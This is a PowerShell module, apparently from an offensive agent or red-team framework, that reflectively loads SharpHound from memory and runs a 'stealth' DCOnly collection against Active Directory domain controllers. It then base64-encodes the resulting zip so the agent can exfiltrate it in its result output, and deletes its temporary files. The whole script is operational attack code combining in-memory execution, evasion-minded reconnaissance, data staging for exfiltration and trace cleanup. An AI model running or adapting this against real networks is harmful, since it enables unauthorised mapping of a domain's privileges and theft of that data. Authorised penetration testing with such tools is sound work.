# bloodhound_sharphound — DCOnly collection via SharpHound (low noise)
# OCD mindmap: ACLs/ACEs permissions branch
$ErrorActionPreference = 'Continue'

if (-not $global:SharpBlobs -or -not $global:SharpBlobs['SharpHound.exe']) {
    throw "SharpHound binary not pre-loaded"
}

$tempDir = Join-Path $env:TEMP "sh_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

$asm = [System.Reflection.Assembly]::Load($global:SharpBlobs['SharpHound.exe'])

# DCOnly + stealth: only LDAP queries against DCs, no SMB/WinRM noise
$shArgs = @('--collectionmethods', 'DCOnly', '--outputdirectory', $tempDir,
            '--zipfilename', 'sh.zip', '--nosavecache')

$sw = New-Object System.IO.StringWriter
[Console]::SetOut($sw)
try {
    $asm.EntryPoint.Invoke($null, @([string[]]$shArgs))
} catch {
    Write-Host "SharpHound failed: $_"
}
$std = New-Object System.IO.StreamWriter([System.Console]::OpenStandardOutput())
$std.AutoFlush = $true
[Console]::SetOut($std)
Write-Output $sw.ToString()

# Base64-encode the zip so the agent can exfil it with the result body
$zip = Join-Path $tempDir 'sh.zip'
if (Test-Path $zip) {
    $bytes = [System.IO.File]::ReadAllBytes($zip)
    Write-Host "SHARPHOUND_ZIP_BASE64_BEGIN"
    Write-Host ([Convert]::ToBase64String($bytes))
    Write-Host "SHARPHOUND_ZIP_BASE64_END"
    Remove-Item $tempDir -Recurse -Force
}
